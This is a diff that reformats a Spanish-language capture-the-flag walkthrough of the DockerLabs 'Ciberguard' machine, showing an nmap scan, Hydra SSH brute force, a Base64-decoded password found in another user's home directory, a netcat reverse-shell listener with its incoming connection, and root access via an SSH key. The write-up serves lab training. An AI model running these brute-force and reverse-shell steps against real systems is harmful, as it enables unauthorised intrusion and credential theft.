@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Ciberguard 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Ciberguard ​​
+
+## 🖥️ Writeup - Ciberguard
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Hydra` `Base64` `Lateral Movement` `Cron Job` `Reverse Shell` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip ciberguard.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh ciberguard.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 16:02 CEST
 Nmap scan report for 172.17.0.2
@@ -94,13 +103,14 @@ Sin embargo, una vez dentro no vemos ninguna vía de explotación clara.
 
 Guardamos los usuarios en un archivo `users.txt` y las contraseñas en `pass.txt` para hacer fuerza bruta a `SSH` con `Hydra`.
 
-# HYDRA
+## HYDRA
 
-```bash 
+```bash
 hydra -L users.txt -P pass.txt ssh://172.17.0.2 -t 64
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -120,7 +130,7 @@ Descubrimos que, con las credenciales encontradas anteriormente, podemos acceder
 ssh chloe@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
@@ -128,7 +138,7 @@ No obstante, no encontramos nada relevante.
 
 Ejecutamos un cat `/etc/passwd` para listar todos los usuarios del sistema y vemos que existen dos más aparte de `chloe`: `pablo` y `veronica`.
 
-Al acceder a `/home/veronica`, tenemos permisos para entrar y leer los archivos de la carpeta. En uno de ellos encontramos lo siguiente: 
+Al acceder a `/home/veronica`, tenemos permisos para entrar y leer los archivos de la carpeta. En uno de ellos encontramos lo siguiente:
 
 ```
 dmVyb25pY2ExMjMK
@@ -136,12 +146,12 @@ dmVyb25pY2ExMjMK
 
 Parece un `string` encriptado en `Base64`, así que probamos a decodificarlo con el comando correspondiente.
 
-
 ```bash
 echo "dmVyb25pY2ExMjMK" | base64 -d
 ```
 
 Info:
+
 ```
 veronica123
 ```
@@ -179,6 +189,7 @@ sudo nc -nlvp 4444
 ```
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [10.0.4.12] from (UNKNOWN) [172.17.0.2] 33726
@@ -187,28 +198,33 @@ bash: no job control in this shell
 pablo@8327ac6ad2ce:~$
 ```
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA A ROOT
+## ESCALADA A ROOT
 
 Comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
@@ -217,6 +233,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for pablo on 8327ac6ad2ce:
     env_reset, mail_badpass,
@@ -238,11 +255,13 @@ Le damos los permisos necesarios:
 ```bash
 chmod 600 id_rsa
 ```
+
 ```bash
 ssh -i id_rsa root@172.17.0.2
 ```
 
 Info:
+
 ```
 root@8327ac6ad2ce:~# whoami
 root
